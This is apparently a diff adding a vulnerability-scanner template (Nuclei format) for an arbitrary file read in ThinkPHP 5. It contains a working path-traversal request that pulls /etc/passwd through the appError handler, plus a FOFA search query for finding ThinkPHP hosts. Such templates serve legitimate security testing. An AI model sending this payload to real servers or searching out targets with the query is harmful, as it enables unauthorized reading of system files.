@@ -1,0 +1,28 @@
+id: TP5-Arbitrary-file-read
+
+info:
+  name: TP5 Arbitrary file read
+  author: momika233
+  severity: high
+  description: TP5-Arbitrary-file-read
+  reference:
+    - https://github.com/momika233
+  tags: TP5,Arbitrary_file-read
+
+requests:
+  - method: GET
+    path:
+      - '{{BaseURL}}/?s=index/think\\Error/appError&errno=1&errstr=1&errline=1&errfile=../../../etc/passwd'
+
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "root:x:0:0"
+        part: body
+
+      - type: status
+        status:
+          - 200
+#fofa-query:"app="ThinkPHP""
